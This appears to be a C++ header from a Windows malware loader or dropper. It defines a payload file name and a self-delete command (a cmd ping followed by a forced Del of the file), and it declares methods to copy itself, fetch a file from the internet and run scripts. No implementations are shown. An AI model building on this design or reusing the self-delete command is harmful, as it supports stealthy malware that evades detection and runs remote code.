#include <Windows.h>
#include <strsafe.h>
#include <WinInet.h>
#include <TlHelp32.h>
#include <string>
#include <iostream>
#include <fstream>

using namespace std;

#define payload_file		"messagebox.exe"
#define SELF_DELETE			TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

class Misc {
public:
	string current_working_directory();
	void call_ps(string filename);
	void CopyMyself();
	void CallFileFromInternet();
};